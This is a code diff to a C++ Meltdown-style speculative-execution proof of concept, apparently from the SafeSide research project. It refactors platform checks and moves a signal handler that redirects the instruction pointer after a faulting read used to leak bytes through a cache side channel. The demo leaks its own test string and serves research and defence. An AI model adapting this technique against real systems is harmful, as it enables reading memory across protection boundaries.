@@ -24,11 +24,13 @@
  * bounds check.
  **/
 
-#if !defined(__linux__) && !defined(__APPLE__)
+#include "compiler_specifics.h"
+
+#if !SAFESIDE_LINUX && !SAFESIDE_MAC
 #  error Unsupported OS. Linux or MacOS required.
 #endif
 
-#ifndef __i386__
+#if !SAFESIDE_IA32
 #  error Unsupported architecture. 32-bit x86 required.
 #endif
 
@@ -40,10 +42,9 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
+#include "local_content.h"
+#include "meltdown_local_content.h"
 #include "utils.h"
-
-const char *public_data = "Hello, world!";
-const char *private_data = "It's a s3kr3t!!!";
 
 // ICC requires the offset variable to be volatile. If it isn't, ICC schedules
 // to spill it to stack after the second ForceRead call and that never happens
@@ -77,9 +78,9 @@ static char LeakByte(const char *data, volatile size_t offset) {
     }
 
     // SIGSEGV signal handler moves the instruction pointer to this label.
-#if defined(__linux__)
+#if SAFESIDE_LINUX
     asm volatile("afterspeculation:");
-#elif defined(__APPLE__)
+#elif SAFESIDE_MAC
     asm volatile("_afterspeculation:");
 #else
 #  error Unsupported OS.
@@ -99,38 +100,14 @@ static char LeakByte(const char *data, volatile size_t offset) {
   }
 }
 
-static void Sigsegv(
-    int /* signum */, siginfo_t * /* siginfo */, void *context) {
-  // SIGSEGV signal handler.
-  // Moves the instruction pointer to the "afterspeculation" label.
-  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
-#ifdef __linux__
-  ucontext->uc_mcontext.gregs[REG_EIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif defined(__APPLE__)
-  ucontext->uc_mcontext->__ss.__eip =
-      reinterpret_cast<uintptr_t>(afterspeculation);
-#else
-#  error Unsupported OS.
-#endif
-}
-
-static void SetSignal() {
-  struct sigaction act;
-  memset(&act, 0, sizeof(struct sigaction));
-  act.sa_sigaction = Sigsegv;
-  act.sa_flags = SA_SIGINFO;
-#ifdef __linux__
-  sigaction(SIGSEGV, &act, nullptr);
-#elif defined(__APPLE__)
-  sigaction(SIGTRAP, &act, nullptr);
-#else
-#  error Unsupported OS.
-#endif
-}
-
 int main() {
-  SetSignal();
+#if SAFESIDE_LINUX
+  OnSignalMoveRipToAfterspeculation(SIGSEGV);
+#elif SAFESIDE_MAC
+  OnSignalMoveRipToAfterspeculation(SIGTRAP);
+#else
+#  error Unsupported OS.
+#endif
   std::cout << "Leaking the string: ";
   std::cout.flush();
   size_t private_offset = private_data - public_data;
